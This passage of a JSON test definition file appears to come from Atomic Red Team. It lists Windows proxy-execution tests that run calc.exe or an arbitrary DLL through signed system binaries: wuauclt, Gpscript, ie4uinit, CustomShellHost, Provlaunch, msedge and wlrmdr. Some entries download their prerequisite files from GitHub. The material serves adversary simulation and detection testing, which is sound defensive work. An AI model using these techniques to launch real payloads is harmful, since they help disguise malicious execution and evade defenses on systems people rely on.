                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{arbitrary_dll}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/bin/calc.dll?raw=true\" -OutFile \"#{arbitrary_dll}\"\n"
                            }
                        ],
                        "executor": {
                            "command": "wuauclt.exe /UpdateDeploymentProvider \"#{arbitrary_dll}\" /RunHandlerComServer\n",
                            "cleanup_command": "taskkill /f /im calculator.exe > nul 2>&1",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Lolbin Gpscript logon option",
                        "auto_generated_guid": "5bcda9cd-8e85-48fa-861d-b5a85d91d48c",
                        "description": "Executes logon scripts configured in Group Policy.\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "Gpscript /logon\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Lolbin Gpscript startup option",
                        "auto_generated_guid": "f8da74bb-21b8-4af9-8d84-f2c8e4a220e3",
                        "description": "Executes startup scripts configured in Group Policy\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "Gpscript /startup\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Lolbas ie4uinit.exe use as proxy",
                        "auto_generated_guid": "13c0804e-615e-43ad-b223-2dfbacd0b0b3",
                        "description": "Executes commands from a specially prepared ie4uinit.inf file.\nPoc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/\nReference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "Path_inf": {
                                "description": "Path to the cab file",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\T1218\\src\\ieuinit.inf"
                            },
                            "Path_ie4uinit": {
                                "description": "Path to ie4uinit.exe",
                                "type": "path",
                                "default": "c:\\windows\\system32\\ie4uinit.exe"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "ieuinit.inf must exist on disk at specified location (#{Path_inf})\n",
                                "prereq_command": "if (Test-Path \"#{Path_inf}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{Path_inf}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/ieuinit.inf\" -OutFile \"#{Path_inf}\"\n"
                            }
                        ],
                        "executor": {
                            "command": "copy #{Path_ie4uinit} %TEMP%\\ie4uinit.exe\ncopy \"#{Path_inf}\" %TEMP%\\ieuinit.inf\n%TEMP%\\ie4uinit.exe -BaseSettings\n",
                            "cleanup_command": "del %TEMP%\\ie4uinit.exe >nul 2>&1\ndel %TEMP%\\ieuinit.inf >nul 2>&1\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "LOLBAS CustomShellHost to Spawn Process",
                        "auto_generated_guid": "b1eeb683-90bb-4365-bbc2-2689015782fe",
                        "description": "This test simulates an adversary copying `customshellhost.exe` and `calc.exe` from `C:\\windows\\system32\\` to `C:\\temp\\`, renaming `calc.exe` to `explorer.exe`.\nUpon execution, customshellhost.exe will spawn calc.exe.\nNote this will only work on Windows 10 or 11.\n[LOLBAS](https://lolbas-project.github.io/lolbas/Binaries/CustomShellHost/)\n[BishopFox](https://bishopfox.com/blog/edr-bypass-with-lolbins)\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "dest_path": {
                                "description": "Directory to copy files into",
                                "type": "path",
                                "default": "C:\\test"
                            }
                        },
                        "executor": {
                            "command": "if (-not (Test-Path #{dest_path})) {\nNew-Item -Path #{dest_path} -ItemType Directory\n} else {\nWrite-Host \"Directory #{dest_path} already exists.\" }\nCopy-Item -Path \"C:\\windows\\system32\\customshellhost.exe\" -Destination \"#{dest_path}\\customshellhost.exe\" -Force\nCopy-Item -Path \"C:\\windows\\system32\\calc.exe\" -Destination \"#{dest_path}\\explorer.exe\" -Force\n#{dest_path}\\customshellhost.exe\n",
                            "cleanup_command": "Remove-Item -Path #{dest_path} -Recurse -Force\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Provlaunch.exe Executes Arbitrary Command via Registry Key",
                        "auto_generated_guid": "ab76e34f-28bf-441f-a39c-8db4835b89cc",
                        "description": "Provlaunch.exe executes a command defined in the Registry. This test will create the necessary registry keys and values, then run provlaunch.exe to execute an arbitrary command.\n- https://twitter.com/0gtweet/status/1674399582162153472\n- https://lolbas-project.github.io/lolbas/Binaries/Provlaunch/\nRegistry keys are deleted after successful execution.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0\nreg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe\nc:\\windows\\system32\\provlaunch.exe LOLBin\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "LOLBAS Msedge to Spawn Process",
                        "auto_generated_guid": "e5eedaed-ad42-4c1e-8783-19529738a349",
                        "description": "Executes a process under a trusted Microsoft signed binary,mseddge. This test will spawn \"calc.exe\" as a child process of msedge.exe\n- https://lolbas-project.github.io/lolbas/Binaries/Msedge/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "$edgePath64 = \"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe\"\nif (Test-Path $edgePath64) {\n    $edgePath = $edgePath64\n} else {\n    # Check 32-bit Edge installation path\n    $edgePath32 = \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"\n    if (Test-Path $edgePath32) {\n        $edgePath = $edgePath32\n    } else {\n        exit 1\n    }\n}\n& $edgePath --disable-gpu-sandbox --gpu-launcher=\"C:\\\\Windows\\\\System32\\\\calc.exe &&\"\nsleep 5\ntaskkill -f -im msedge.exe\ntaskkill -f -im calc.exe\ntaskkill -f -im win32calc.exe\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "System Binary Proxy Execution - Wlrmdr Lolbin",
                        "auto_generated_guid": "7816c252-b728-4ea6-a683-bd9441ca0b71",
                        "description": "Use wlrmdr(Windows Logon Reminder executable) as a proxy binary to evade defensive countermeasures",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "payload_path": {
                                "description": "Path to the executable",
                                "type": "String",
                                "default": "C:\\Windows\\System32\\calc.exe"
                            }
                        },
                        "executor": {
                            "command": "wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u \"#{payload_path}\"",
                            "name": "powershell",
                            "elevation_required": false
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 14:10:29"
}